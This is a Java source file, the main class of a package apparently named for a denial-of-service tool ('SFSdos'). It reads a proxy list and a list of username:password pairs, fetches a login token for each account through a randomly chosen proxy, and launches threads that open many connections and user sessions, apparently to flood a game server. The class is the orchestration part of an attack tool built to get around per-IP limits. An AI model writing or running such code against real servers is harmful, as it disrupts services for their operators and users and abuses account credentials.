package SFSdos;

import SFSdos.conn.ConnectionFactory;
import SFSdos.user.UserFactory;
import SFSdos.user.UserObject;
import org.apache.http.HttpHost;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Random;
import java.util.stream.Stream;

public class Main {
    public ConnectionFactory connFactory;
    public UserFactory userFactory;
    public HashMap<String, String> proxyMap;
    public Random random;

    public static void main(String[] args) {
        Config.load();

        Main main = new Main();
        main.proxyMap = new HashMap<>();
        main.random = new Random();
        main.loadProxyList();
        main.loadUserList();
        main.initializeUsers();
        main.initializeConnections();
    }

    public Main() {
        connFactory = new ConnectionFactory(this);
        userFactory = new UserFactory(this);
    }

    private void initializeConnections() {
        if (!Config.initializeConnections)
            return;

        Thread thread = new Thread(connFactory);
        thread.start();
    }

    private void initializeUsers() {
        if (!Config.initializeUsers)
            return;

        Thread thread = new Thread(userFactory);
        thread.start();
    }

    private void loadUserList() {
        if (Config.listUsers.isEmpty())
            return;

        try (Stream<String> stream = Files.lines(Paths.get(Config.listUsers))) {
            stream.forEach(s -> {
                String data[] = s.split(":");
                System.out.format("[Main] Loading user %s with pass %s from %s\n", data[0], data[1], Config.listUsers);

                if (userFactory.users.size() < Config.maxConnections)
                    if (Config.initializeProxies && !proxyMap.isEmpty()) {

                        Object[] keys = proxyMap.keySet().toArray();
                        Object[] values = proxyMap.values().toArray();
                        Integer index = random.nextInt(proxyMap.size());

                        String ip = (String) keys[index];
                        String port = (String) values[index];

                        UserObject user = new UserObject(data[0], data[1], "", this, new HttpHost(ip, Integer.parseInt(port)));
                        String token = user.fetchToken();
                        if (token != null) {
                            user.setToken(token);
                            userFactory.users.add(user);
                        }
                    } else {
                        UserObject user = new UserObject(data[0], data[1], "", this);
                        String token = user.fetchToken();
                        if (token != null) {
                            user.setToken(token);
                            userFactory.users.add(user);
                        }
                    }
            });
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void loadProxyList() {
        if (Config.listProxy.isEmpty())
            return;

        proxyMap = new HashMap<>();
        try (Stream<String> stream = Files.lines(Paths.get(Config.listProxy))) {
            stream.forEach(s -> {
                String data[] = s.split(":");
                System.out.format("[Main] Loading proxy %s with port %s from %s\n", data[0], data[1], Config.listProxy);
                proxyMap.put(data[0], data[1]);
            });
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
